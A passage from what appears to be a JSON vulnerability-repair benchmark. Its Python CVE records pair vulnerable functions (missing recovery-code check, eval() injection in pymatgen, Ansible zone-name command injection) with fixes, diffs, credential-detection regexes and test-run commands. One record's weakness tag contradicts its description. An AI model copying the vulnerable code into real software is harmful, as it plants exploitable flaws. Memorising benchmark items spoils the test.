        "snippet": "class SecretDetector(logging.Formatter):\n    AWS_KEY_PATTERN = re.compile(\n        r\"(aws_key_id|aws_secret_key|access_key_id|secret_access_key)\\s*=\\s*'([^']+)'\",\n        flags=re.IGNORECASE,\n    )\n    AWS_TOKEN_PATTERN = re.compile(\n        r'(accessToken|tempToken|keySecret)\"\\s*:\\s*\"([a-z0-9/+]{32,}={0,2})\"',\n        flags=re.IGNORECASE,\n    )\n    SAS_TOKEN_PATTERN = re.compile(\n        r\"(sig|signature|AWSAccessKeyId|password|passcode)=(?P<secret>[a-z0-9%/+]{16,})\",\n        flags=re.IGNORECASE,\n    )\n    PRIVATE_KEY_PATTERN = re.compile(\n        r\"-{3,}BEGIN [A-Z ]*PRIVATE KEY-{3,}\\n([\\s\\S]*?)\\n-{3,}END [A-Z ]*PRIVATE KEY-{3,}\",\n        flags=re.MULTILINE | re.IGNORECASE,\n    )\n    PRIVATE_KEY_DATA_PATTERN = re.compile(\n        r'\"privateKeyData\": \"([a-z0-9/+=\\\\n]{10,})\"', flags=re.MULTILINE | re.IGNORECASE\n    )\n    CONNECTION_TOKEN_PATTERN = re.compile(\n        r\"(token|assertion content)\" r\"([\\'\\\"\\s:=]+)\" r\"([a-z0-9=/_\\-\\+\\.]{8,})\",\n        flags=re.IGNORECASE,\n    )\n\n    PASSWORD_PATTERN = re.compile(\n        r\"(password\"\n        r\"|pwd)\"\n        r\"([\\'\\\"\\s:=]+)\"\n        r\"([a-z0-9!\\\"#\\$%&\\\\\\'\\(\\)\\*\\+\\,-\\./:;<=>\\?\\@\\[\\]\\^_`\\{\\|\\}~]{1,})\",\n        flags=re.IGNORECASE,\n    )"
      }
    ],
    "vul_patch": "--- a/src/snowflake/connector/secret_detector.py\n+++ b/src/snowflake/connector/secret_detector.py\n@@ -12,14 +12,14 @@\n         flags=re.IGNORECASE,\n     )\n     PRIVATE_KEY_PATTERN = re.compile(\n-        r\"-----BEGIN PRIVATE KEY-----\\\\n([a-z0-9/+=\\\\n]{32,})\\\\n-----END PRIVATE KEY-----\",\n+        r\"-{3,}BEGIN [A-Z ]*PRIVATE KEY-{3,}\\n([\\s\\S]*?)\\n-{3,}END [A-Z ]*PRIVATE KEY-{3,}\",\n         flags=re.MULTILINE | re.IGNORECASE,\n     )\n     PRIVATE_KEY_DATA_PATTERN = re.compile(\n         r'\"privateKeyData\": \"([a-z0-9/+=\\\\n]{10,})\"', flags=re.MULTILINE | re.IGNORECASE\n     )\n     CONNECTION_TOKEN_PATTERN = re.compile(\n-        r\"(token|assertion content)\" r\"([\\'\\\"\\s:=]+)\" r\"([a-z0-9=/_\\-\\+]{8,})\",\n+        r\"(token|assertion content)\" r\"([\\'\\\"\\s:=]+)\" r\"([a-z0-9=/_\\-\\+\\.]{8,})\",\n         flags=re.IGNORECASE,\n     )\n \n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2024-49750:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/snowflake-connector-python\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2024-49750/bin/python -m pytest test/unit/test_log_secret_detector.py  -k \"test_mask_token\"\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2024-49750:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/snowflake-connector-python\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2024-49750/bin/python -m pytest test/unit/test_log_secret_detector.py\n"
  },
  {
    "cve_id": "CVE-2024-47768",
    "cve_description": "Lif Authentication Server is a server used by Lif to do various tasks regarding Lif accounts. This vulnerability has to do with the account recovery system where there does not appear to be a check to make sure the user has been sent the recovery email and entered the correct code. If the attacker knew the email of the target, they could supply the email and immediately prompt the server to update the password without ever needing the code. This issue has been patched in version 1.7.3.",
    "cwe_info": {
      "CWE-862": {
        "name": "Missing Authorization",
        "description": "The product does not perform an authorization check when an actor attempts to access a resource or perform an action."
      }
    },
    "repo": "https://github.com/Lif-Platforms/Lif-Auth-Server",
    "patch_url": [
      "https://github.com/Lif-Platforms/Lif-Auth-Server/commit/8dbd7cad914a8b939451c652bfb716aa796f754e"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_333_1",
        "commit": "2f7ea46",
        "file_path": "src/auth_server.py",
        "start_line": 227,
        "end_line": 241,
        "snippet": "async def log_out(response: Response):\n    \"\"\"\n    ## Logout Route For Lif Accounts\n    Handles the logout process for Lif Accounts.\n\n    ### Parameters:\n    none\n\n    ### Returns:\n    - **STRING:** Status of the operation.\n    \"\"\"\n    response.delete_cookie(key=\"LIF_USERNAME\", path=\"/\", domain=\".lifplatforms.com\")\n    response.delete_cookie(key=\"LIF_TOKEN\", path=\"/\", domain=\".lifplatforms.com\")\n\n    return \"Logout Successful\""
      },
      {
        "id": "vul_py_333_2",
        "commit": "2f7ea46",
        "file_path": "src/auth_server.py",
        "start_line": 448,
        "end_line": 470,
        "snippet": "async def get_pfp(username: str):\n    \"\"\"\n    ## Get User Avatar (Profile Picture)\n    Allows services to get the avatar (profile picture) of a specified account. \n    \n    ### Parameters:\n    - **username (str):** The username for the account.\n\n    ### Returns:\n    - **file:** The avatar the service requested.\n    \"\"\"\n    # Sanitize the username\n    filtered_username = re.sub(r'[^a-zA-Z1-9\\._]+', '', username)\n        \n    # Construct the file path using the sanitized username\n    avatar_path = f\"user_images/pfp/{filtered_username}\"\n\n    # Check if the file exists and is a regular file\n    if os.path.isfile(avatar_path):\n        return FileResponse(avatar_path, media_type='image/gif')\n    else:\n        # Return default image if the user's banner doesn't exist\n        return FileResponse(f'{assets_folder}/default_pfp.png', media_type='image/gif')"
      },
      {
        "id": "vul_py_333_3",
        "commit": "2f7ea46",
        "file_path": "src/auth_server.py",
        "start_line": 474,
        "end_line": 496,
        "snippet": "async def get_banner(username: str):\n    \"\"\"\n    ## Get User Banner\n    Allows services to get the account banner of a specified account.\n    \n    ### Parameters:\n    - **username (str):** The username for the account.\n\n    ### Returns:\n    - **file:** The banner the service requested.\n    \"\"\"\n    # Sanitize the username\n    filtered_username = re.sub(r'[^a-zA-Z1-9\\._]+', '', username)\n\n    # Construct the file path using the sanitized username\n    banner_path = f\"user_images/banner/{filtered_username}\"\n\n    # Check if the file exists and is a regular file\n    if os.path.isfile(banner_path):\n        return FileResponse(banner_path, media_type='image/gif')\n    else:\n        # Return default image if the user's banner doesn't exist\n        return FileResponse(f'{assets_folder}/default_banner.png', media_type='image/gif')"
      },
      {
        "id": "vul_py_333_4",
        "commit": "2f7ea46",
        "file_path": "src/auth_server.py",
        "start_line": 649,
        "end_line": 700,
        "snippet": "async def account_recovery(websocket: WebSocket):\n    await websocket.accept()\n\n    # Stores email and code for later use\n    user_email = None\n    user_code = None\n\n    # Wait for client to send data\n    while True:\n        # Tries to receive data from client, if fails then the connection is closed\n        try:\n            data = await websocket.receive_json()\n\n            # Check what kind of data the client sent\n            if 'email' in data:\n                # Check email with database\n                if database.auth.check_email(data['email']):\n                    user_email = data['email']\n\n                    # Send recovery code to user\n                    user_code = mail_service.send_recovery_email(user_email)\n\n                    # Tell client email was received\n                    await websocket.send_json({\"responseType\": \"emailSent\", \"message\": \"Email sent successfully.\"})\n                else:\n                    # Tell client email is invalid\n                    await websocket.send_json({\"responseType\": \"error\", \"message\": \"Invalid Email!\"})\n                    \n            elif 'code' in data:\n                # Compare generated code with user provided code\n                if data['code'] == user_code:\n                    await websocket.send_json({\"responseType\": \"codeCorrect\", \"message\": \"Code validated successfully.\"})\n                else:\n                    await websocket.send_json({\"responseType\": \"error\", \"message\": \"Bad Code\"})\n                    \n            elif 'password' in data:\n                # Get password hash and gen salt\n                password_hash = hasher.get_hash_gen_salt(data['password'])\n\n                # Get username from email\n                username = database.get_username_from_email(user_email)\n\n                # Update password and salt in database\n                database.update.update_password(username, password_hash['password'])\n                database.update.update_user_salt(username, password_hash['salt'])\n\n                # Get user token\n                token = database.info.retrieve_user_token(username)\n\n                await websocket.send_json({\"responseType\": \"passwordUpdated\", \"username\": username, \"token\": token})\n            else:\n                await websocket.send_json({\"responseType\": \"error\", \"message\": \"Bad Request\"})"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_333_1",
        "commit": "8dbd7cad914a8b939451c652bfb716aa796f754e",
        "file_path": "src/auth_server.py",
        "start_line": 228,
        "end_line": 263,
        "snippet": "async def log_out(response: Response, redirect = None):\n    \"\"\"\n    ## Logout Route For Lif Accounts\n    Handles the logout process for Lif Accounts.\n\n    ### Parameters:\n    none\n\n    ### Query Parameters\n    - **redirect:** url to redirect to after the logout completes.\n\n    ### Returns:\n    - **STRING:** Status of the operation.\n    \"\"\"\n    response.delete_cookie(key=\"LIF_USERNAME\", path=\"/\", domain=\".lifplatforms.com\")\n    response.delete_cookie(key=\"LIF_TOKEN\", path=\"/\", domain=\".lifplatforms.com\")\n\n    # Create a RedirectResponse\n    redirect_response = RedirectResponse(url=redirect)\n\n    # Copy the cookies from the response to the redirect response\n    for cookie in response.headers.getlist(\"set-cookie\"):\n        redirect_response.headers.append(\"set-cookie\", cookie)\n\n    if redirect != None:\n        # Check to ensure redirect URL goes to a Lif Platforms domain\n        extracted = tldextract.extract(redirect)\n        domain = f\"{extracted.domain}.{extracted.suffix}\"\n\n        if domain == \"lifplatforms.com\":\n            return redirect_response\n        else:\n            print(domain)\n            raise HTTPException(status_code=400, detail=\"Untrusted redirect url.\")\n    else:\n        return \"Log Out Successful\""
      },
      {
        "id": "fix_py_333_2",
        "commit": "8dbd7cad914a8b939451c652bfb716aa796f754e",
        "file_path": "src/auth_server.py",
        "start_line": 470,
        "end_line": 497,
        "snippet": "async def get_pfp(username: str):\n    \"\"\"\n    ## Get User Avatar (Profile Picture)\n    Allows services to get the avatar (profile picture) of a specified account. \n    \n    ### Parameters:\n    - **username (str):** The username for the account.\n\n    ### Returns:\n    - **file:** The avatar the service requested.\n    \"\"\"\n    # Sanitize the username\n    filtered_username = re.sub(r'[^a-zA-Z1-9\\._]+', '', username)\n        \n    # Construct the file path using the sanitized username\n    avatar_path = f\"user_images/pfp/{filtered_username}\"\n\n    # Check if the file exists and is a regular file\n    if os.path.isfile(avatar_path):\n        response = FileResponse(avatar_path, media_type='image/gif')\n    else:\n        # Return default image if the user's banner doesn't exist\n        response = FileResponse(f'{assets_folder}/default_pfp.png', media_type='image/gif')\n\n    # Add caching limit to image\n    response.headers[\"Cache-Control\"] = \"public, max-age=3600\"\n\n    return response"
      },
      {
        "id": "fix_py_333_3",
        "commit": "8dbd7cad914a8b939451c652bfb716aa796f754e",
        "file_path": "src/auth_server.py",
        "start_line": 501,
        "end_line": 528,
        "snippet": "async def get_banner(username: str):\n    \"\"\"\n    ## Get User Banner\n    Allows services to get the account banner of a specified account.\n    \n    ### Parameters:\n    - **username (str):** The username for the account.\n\n    ### Returns:\n    - **file:** The banner the service requested.\n    \"\"\"\n    # Sanitize the username\n    filtered_username = re.sub(r'[^a-zA-Z1-9\\._]+', '', username)\n\n    # Construct the file path using the sanitized username\n    banner_path = f\"user_images/banner/{filtered_username}\"\n\n    # Check if the file exists and is a regular file\n    if os.path.isfile(banner_path):\n        response = FileResponse(banner_path, media_type='image/gif')\n    else:\n        # Return default image if the user's banner doesn't exist\n        response = FileResponse(f'{assets_folder}/default_banner.png', media_type='image/gif')\n\n    # Add caching time limit to image\n    response.headers[\"Cache-Control\"] = \"public, max-age=3600\"\n\n    return response"
      },
      {
        "id": "fix_py_333_4",
        "commit": "8dbd7cad914a8b939451c652bfb716aa796f754e",
        "file_path": "src/auth_server.py",
        "start_line": 681,
        "end_line": 741,
        "snippet": "async def account_recovery(websocket: WebSocket):\n    await websocket.accept()\n\n    # Stores email and code for later use\n    user_email = None\n    user_code = None\n\n    # Determines if the user has entered the correct code from the recovery email\n    authenticated = False\n\n    # Wait for client to send data\n    while True:\n        # Tries to receive data from client, if fails then the connection is closed\n        try:\n            data = await websocket.receive_json()\n\n            # Check what kind of data the client sent\n            if 'email' in data:\n                # Check email with database\n                if database.auth.check_email(data['email']):\n                    user_email = data['email']\n\n                    # Send recovery code to user\n                    user_code = mail_service.send_recovery_email(user_email)\n\n                    # Tell client email was received\n                    await websocket.send_json({\"responseType\": \"emailSent\", \"message\": \"Email sent successfully.\"})\n                else:\n                    # Tell client email is invalid\n                    await websocket.send_json({\"responseType\": \"error\", \"message\": \"Invalid Email!\"})\n                    \n            elif 'code' in data:\n                # Compare generated code with user provided code\n                if data['code'] == user_code:\n                    # Sets the user to authenticated so the password can be updated\n                    authenticated = True\n\n                    await websocket.send_json({\"responseType\": \"codeCorrect\", \"message\": \"Code validated successfully.\"})\n                else:\n                    await websocket.send_json({\"responseType\": \"error\", \"message\": \"Bad Code\"})\n                    \n            elif 'password' in data:\n                if authenticated:\n                    # Get password hash and gen salt\n                    password_hash = hasher.get_hash_gen_salt(data['password'])\n\n                    # Get username from email\n                    username = database.get_username_from_email(user_email)\n\n                    # Update password and salt in database\n                    database.update.update_password(username, password_hash['password'])\n                    database.update.update_user_salt(username, password_hash['salt'])\n\n                    # Get user token\n                    token = database.info.retrieve_user_token(username)\n\n                    await websocket.send_json({\"responseType\": \"passwordUpdated\", \"username\": username, \"token\": token})\n                else:\n                    await websocket.send_json({\"responseType\": \"error\", \"message\": \"You have not authenticated yet\"})\n            else:\n                await websocket.send_json({\"responseType\": \"error\", \"message\": \"Bad Request\"})"
      }
    ],
    "vul_patch": "--- a/src/auth_server.py\n+++ b/src/auth_server.py\n@@ -1,4 +1,4 @@\n-async def log_out(response: Response):\n+async def log_out(response: Response, redirect = None):\n     \"\"\"\n     ## Logout Route For Lif Accounts\n     Handles the logout process for Lif Accounts.\n@@ -6,10 +6,31 @@\n     ### Parameters:\n     none\n \n+    ### Query Parameters\n+    - **redirect:** url to redirect to after the logout completes.\n+\n     ### Returns:\n     - **STRING:** Status of the operation.\n     \"\"\"\n     response.delete_cookie(key=\"LIF_USERNAME\", path=\"/\", domain=\".lifplatforms.com\")\n     response.delete_cookie(key=\"LIF_TOKEN\", path=\"/\", domain=\".lifplatforms.com\")\n \n-    return \"Logout Successful\"\n+    # Create a RedirectResponse\n+    redirect_response = RedirectResponse(url=redirect)\n+\n+    # Copy the cookies from the response to the redirect response\n+    for cookie in response.headers.getlist(\"set-cookie\"):\n+        redirect_response.headers.append(\"set-cookie\", cookie)\n+\n+    if redirect != None:\n+        # Check to ensure redirect URL goes to a Lif Platforms domain\n+        extracted = tldextract.extract(redirect)\n+        domain = f\"{extracted.domain}.{extracted.suffix}\"\n+\n+        if domain == \"lifplatforms.com\":\n+            return redirect_response\n+        else:\n+            print(domain)\n+            raise HTTPException(status_code=400, detail=\"Untrusted redirect url.\")\n+    else:\n+        return \"Log Out Successful\"\n\n--- a/src/auth_server.py\n+++ b/src/auth_server.py\n@@ -17,7 +17,12 @@\n \n     # Check if the file exists and is a regular file\n     if os.path.isfile(avatar_path):\n-        return FileResponse(avatar_path, media_type='image/gif')\n+        response = FileResponse(avatar_path, media_type='image/gif')\n     else:\n         # Return default image if the user's banner doesn't exist\n-        return FileResponse(f'{assets_folder}/default_pfp.png', media_type='image/gif')\n+        response = FileResponse(f'{assets_folder}/default_pfp.png', media_type='image/gif')\n+\n+    # Add caching limit to image\n+    response.headers[\"Cache-Control\"] = \"public, max-age=3600\"\n+\n+    return response\n\n--- a/src/auth_server.py\n+++ b/src/auth_server.py\n@@ -17,7 +17,12 @@\n \n     # Check if the file exists and is a regular file\n     if os.path.isfile(banner_path):\n-        return FileResponse(banner_path, media_type='image/gif')\n+        response = FileResponse(banner_path, media_type='image/gif')\n     else:\n         # Return default image if the user's banner doesn't exist\n-        return FileResponse(f'{assets_folder}/default_banner.png', media_type='image/gif')\n+        response = FileResponse(f'{assets_folder}/default_banner.png', media_type='image/gif')\n+\n+    # Add caching time limit to image\n+    response.headers[\"Cache-Control\"] = \"public, max-age=3600\"\n+\n+    return response\n\n--- a/src/auth_server.py\n+++ b/src/auth_server.py\n@@ -4,6 +4,9 @@\n     # Stores email and code for later use\n     user_email = None\n     user_code = None\n+\n+    # Determines if the user has entered the correct code from the recovery email\n+    authenticated = False\n \n     # Wait for client to send data\n     while True:\n@@ -29,24 +32,30 @@\n             elif 'code' in data:\n                 # Compare generated code with user provided code\n                 if data['code'] == user_code:\n+                    # Sets the user to authenticated so the password can be updated\n+                    authenticated = True\n+\n                     await websocket.send_json({\"responseType\": \"codeCorrect\", \"message\": \"Code validated successfully.\"})\n                 else:\n                     await websocket.send_json({\"responseType\": \"error\", \"message\": \"Bad Code\"})\n                     \n             elif 'password' in data:\n-                # Get password hash and gen salt\n-                password_hash = hasher.get_hash_gen_salt(data['password'])\n+                if authenticated:\n+                    # Get password hash and gen salt\n+                    password_hash = hasher.get_hash_gen_salt(data['password'])\n \n-                # Get username from email\n-                username = database.get_username_from_email(user_email)\n+                    # Get username from email\n+                    username = database.get_username_from_email(user_email)\n \n-                # Update password and salt in database\n-                database.update.update_password(username, password_hash['password'])\n-                database.update.update_user_salt(username, password_hash['salt'])\n+                    # Update password and salt in database\n+                    database.update.update_password(username, password_hash['password'])\n+                    database.update.update_user_salt(username, password_hash['salt'])\n \n-                # Get user token\n-                token = database.info.retrieve_user_token(username)\n+                    # Get user token\n+                    token = database.info.retrieve_user_token(username)\n \n-                await websocket.send_json({\"responseType\": \"passwordUpdated\", \"username\": username, \"token\": token})\n+                    await websocket.send_json({\"responseType\": \"passwordUpdated\", \"username\": username, \"token\": token})\n+                else:\n+                    await websocket.send_json({\"responseType\": \"error\", \"message\": \"You have not authenticated yet\"})\n             else:\n                 await websocket.send_json({\"responseType\": \"error\", \"message\": \"Bad Request\"})\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-23346",
    "cve_description": "Pymatgen (Python Materials Genomics) is an open-source Python library for materials analysis. A critical security vulnerability exists in the `JonesFaithfulTransformation.from_transformation_str()` method within the `pymatgen` library prior to version 2024.2.20. This method insecurely utilizes `eval()` for processing input, enabling execution of arbitrary code when parsing untrusted input. Version 2024.2.20 fixes this issue.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/materialsproject/pymatgen",
    "patch_url": [
      "https://github.com/materialsproject/pymatgen/commit/c231cbd3d5147ee920a37b6ee9dd236b376bcf5a"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_291_1",
        "commit": "12ab947",
        "file_path": "pymatgen/symmetry/settings.py",
        "start_line": 84,
        "end_line": 116,
        "snippet": "    def parse_transformation_string(\n        transformation_string: str = \"a,b,c;0,0,0\",\n    ) -> tuple[list[list[float]] | np.ndarray, list[float]]:\n        \"\"\"\n        Args:\n            transformation_string (str, optional): Defaults to \"a,b,c;0,0,0\".\n\n        Raises:\n            ValueError: When transformation string fails to parse.\n\n        Returns:\n            tuple[list[list[float]] | np.ndarray, list[float]]: transformation matrix & vector\n        \"\"\"\n        try:\n            a, b, c = np.eye(3)\n            b_change, o_shift = transformation_string.split(\";\")\n            basis_change = b_change.split(\",\")\n            origin_shift = o_shift.split(\",\")\n            # add implicit multiplication symbols\n            basis_change = [\n                re.sub(r\"(?<=\\w|\\))(?=\\() | (?<=\\))(?=\\w) | (?<=(\\d|a|b|c))(?=([abc]))\", r\"*\", string, flags=re.X)\n                for string in basis_change\n            ]\n            # should be fine to use eval here but be mindful for security\n            # reasons\n            # see http://lybniz2.sourceforge.net/safeeval.html\n            # could replace with regex? or sympy expression?\n            P = np.array([eval(x, {\"__builtins__\": None}, {\"a\": a, \"b\": b, \"c\": c}) for x in basis_change])\n            P = P.transpose()  # by convention\n            p = [float(Fraction(x)) for x in origin_shift]\n            return P, p\n        except Exception:\n            raise ValueError(\"Failed to parse transformation string.\")"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_291_1",
        "commit": "c231cbd3d5147ee920a37b6ee9dd236b376bcf5a",
        "file_path": "pymatgen/symmetry/settings.py",
        "start_line": 85,
        "end_line": 126,
        "snippet": "    @staticmethod\n    def parse_transformation_string(\n        transformation_string: str = \"a,b,c;0,0,0\",\n    ) -> tuple[list[list[float]] | np.ndarray, list[float]]:\n        \"\"\"\n        Args:\n            transformation_string (str, optional): Defaults to \"a,b,c;0,0,0\".\n\n        Raises:\n            ValueError: When transformation string fails to parse.\n\n        Returns:\n            tuple[list[list[float]] | np.ndarray, list[float]]: transformation matrix & vector\n        \"\"\"\n        try:\n            a, b, c = np.eye(3)\n            b_change, o_shift = transformation_string.split(\";\")\n            basis_change = b_change.split(\",\")\n            origin_shift = o_shift.split(\",\")\n\n            # add implicit multiplication symbols\n            basis_change = [\n                re.sub(r\"(?<=\\w|\\))(?=\\() | (?<=\\))(?=\\w) | (?<=(\\d|a|b|c))(?=([abc]))\", r\"*\", string, flags=re.X)\n                for string in basis_change\n            ]\n\n            # basic input sanitation\n            allowed_chars = \"0123456789+-*/.abc()\"\n            basis_change = [\"\".join([c for c in string if c in allowed_chars]) for string in basis_change]\n\n            # requires round-trip to sympy to evaluate\n            # (alternatively, `numexpr` looks like a nice solution but requires an additional dependency)\n            basis_change = [\n                parse_expr(string).subs({\"a\": Matrix(a), \"b\": Matrix(b), \"c\": Matrix(c)}) for string in basis_change\n            ]\n            # convert back to numpy, perform transpose by convention\n            P = np.array(basis_change, dtype=float).T[0]\n\n            p = [float(Fraction(x)) for x in origin_shift]\n            return P, p\n        except Exception as exc:\n            raise ValueError(f\"Failed to parse transformation string: {exc}\")"
      }
    ],
    "vul_patch": "--- a/pymatgen/symmetry/settings.py\n+++ b/pymatgen/symmetry/settings.py\n@@ -1,3 +1,4 @@\n+    @staticmethod\n     def parse_transformation_string(\n         transformation_string: str = \"a,b,c;0,0,0\",\n     ) -> tuple[list[list[float]] | np.ndarray, list[float]]:\n@@ -16,18 +17,26 @@\n             b_change, o_shift = transformation_string.split(\";\")\n             basis_change = b_change.split(\",\")\n             origin_shift = o_shift.split(\",\")\n+\n             # add implicit multiplication symbols\n             basis_change = [\n                 re.sub(r\"(?<=\\w|\\))(?=\\() | (?<=\\))(?=\\w) | (?<=(\\d|a|b|c))(?=([abc]))\", r\"*\", string, flags=re.X)\n                 for string in basis_change\n             ]\n-            # should be fine to use eval here but be mindful for security\n-            # reasons\n-            # see http://lybniz2.sourceforge.net/safeeval.html\n-            # could replace with regex? or sympy expression?\n-            P = np.array([eval(x, {\"__builtins__\": None}, {\"a\": a, \"b\": b, \"c\": c}) for x in basis_change])\n-            P = P.transpose()  # by convention\n+\n+            # basic input sanitation\n+            allowed_chars = \"0123456789+-*/.abc()\"\n+            basis_change = [\"\".join([c for c in string if c in allowed_chars]) for string in basis_change]\n+\n+            # requires round-trip to sympy to evaluate\n+            # (alternatively, `numexpr` looks like a nice solution but requires an additional dependency)\n+            basis_change = [\n+                parse_expr(string).subs({\"a\": Matrix(a), \"b\": Matrix(b), \"c\": Matrix(c)}) for string in basis_change\n+            ]\n+            # convert back to numpy, perform transpose by convention\n+            P = np.array(basis_change, dtype=float).T[0]\n+\n             p = [float(Fraction(x)) for x in origin_shift]\n             return P, p\n-        except Exception:\n-            raise ValueError(\"Failed to parse transformation string.\")\n+        except Exception as exc:\n+            raise ValueError(f\"Failed to parse transformation string: {exc}\")\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2019-14904",
    "cve_description": "A flaw was found in the solaris_zone module from the Ansible Community modules. When setting the name for the zone on the Solaris host, the zone name is checked by listing the process with the 'ps' bare command on the remote machine. An attacker could take advantage of this flaw by crafting the name of the zone and executing arbitrary commands in the remote host. Ansible Engine 2.7.15, 2.8.7, and 2.9.2 as well as previous versions are affected.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/ansible/ansible",
    "patch_url": [
      "https://github.com/ansible/ansible/commit/a1b0f72c98b4b2afaab8aafa255e82c2075049c8",
      "https://github.com/ansible/ansible/commit/6a86650109b8654f5898369e45d3857624edf907",
      "https://github.com/ansible/ansible/commit/589a415f887b6f2bb65cd07fe6b2e9d0a8156b69"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_373_1",
        "commit": "755348d870f5b0c25a2fb334cd91c8702e6403b3",
        "file_path": "lib/ansible/modules/system/solaris_zone.py",
        "start_line": 157,
        "end_line": 184,
        "snippet": "    def __init__(self, module):\n        self.changed = False\n        self.msg = []\n\n        self.module = module\n        self.path = self.module.params['path']\n        self.name = self.module.params['name']\n        self.sparse = self.module.params['sparse']\n        self.root_password = self.module.params['root_password']\n        self.timeout = self.module.params['timeout']\n        self.config = self.module.params['config']\n        self.create_options = self.module.params['create_options']\n        self.install_options = self.module.params['install_options']\n        self.attach_options = self.module.params['attach_options']\n\n        self.zoneadm_cmd = self.module.get_bin_path('zoneadm', True)\n        self.zonecfg_cmd = self.module.get_bin_path('zonecfg', True)\n        self.ssh_keygen_cmd = self.module.get_bin_path('ssh-keygen', True)\n\n        if self.module.check_mode:\n            self.msg.append('Running in check mode')\n\n        if platform.system() != 'SunOS':\n            self.module.fail_json(msg='This module requires Solaris')\n\n        (self.os_major, self.os_minor) = platform.release().split('.')\n        if int(self.os_minor) < 10:\n            self.module.fail_json(msg='This module requires Solaris 10 or later')"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_373_1",
        "commit": "a1b0f72c98b4b2afaab8aafa255e82c2075049c8",
        "file_path": "lib/ansible/modules/system/solaris_zone.py",
        "start_line": 162,
        "end_line": 194,
        "snippet": "    def __init__(self, module):\n        self.changed = False\n        self.msg = []\n\n        self.module = module\n        self.path = self.module.params['path']\n        self.name = self.module.params['name']\n        self.sparse = self.module.params['sparse']\n        self.root_password = self.module.params['root_password']\n        self.timeout = self.module.params['timeout']\n        self.config = self.module.params['config']\n        self.create_options = self.module.params['create_options']\n        self.install_options = self.module.params['install_options']\n        self.attach_options = self.module.params['attach_options']\n\n        self.zoneadm_cmd = self.module.get_bin_path('zoneadm', True)\n        self.zonecfg_cmd = self.module.get_bin_path('zonecfg', True)\n        self.ssh_keygen_cmd = self.module.get_bin_path('ssh-keygen', True)\n\n        if self.module.check_mode:\n            self.msg.append('Running in check mode')\n\n        if platform.system() != 'SunOS':\n            self.module.fail_json(msg='This module requires Solaris')\n\n        (self.os_major, self.os_minor) = platform.release().split('.')\n        if int(self.os_minor) < 10:\n            self.module.fail_json(msg='This module requires Solaris 10 or later')\n\n        match = re.match('^[a-zA-Z0-9][-_.a-zA-Z0-9]{0,62}$', self.name)\n        if not match:\n            self.module.fail_json(msg=\"Provided zone name is not a valid zone name. \"\n                                      \"Please refer documentation for correct zone name specifications.\")"
      }
    ],
    "vul_patch": "--- a/lib/ansible/modules/system/solaris_zone.py\n+++ b/lib/ansible/modules/system/solaris_zone.py\n@@ -26,3 +26,8 @@\n         (self.os_major, self.os_minor) = platform.release().split('.')\n         if int(self.os_minor) < 10:\n             self.module.fail_json(msg='This module requires Solaris 10 or later')\n+\n+        match = re.match('^[a-zA-Z0-9][-_.a-zA-Z0-9]{0,62}$', self.name)\n+        if not match:\n+            self.module.fail_json(msg=\"Provided zone name is not a valid zone name. \"\n+                                      \"Please refer documentation for correct zone name specifications.\")\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-40896",
    "cve_description": "A ReDoS issue was discovered in pygments/lexers/smithy.py in pygments through 2.15.0 via SmithyLexer.",
    "cwe_info": {
      "CWE-434": {
        "name": "Unrestricted Upload of File with Dangerous Type",
        "description": "The product allows the upload or transfer of dangerous file types that are automatically processed within its environment."
      }
    },
    "repo": "https://github.com/pygments/pygments",
    "patch_url": [
      "https://github.com/pygments/pygments/commit/97eb3d5ec7c1b3ea4fcf9dee30a2309cf92bd194",
      "https://github.com/pygments/pygments/commit/dd52102c38ebe78cd57748e09f38929fd283ad04",
      "https://github.com/pygments/pygments/commit/fdf182a7af85b1deeeb637ca970d31935e7c9d52"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_191_1",
        "commit": "5f8c541",
        "file_path": "pygments/lexers/templates.py",
        "start_line": 2285,
        "end_line": 2300,
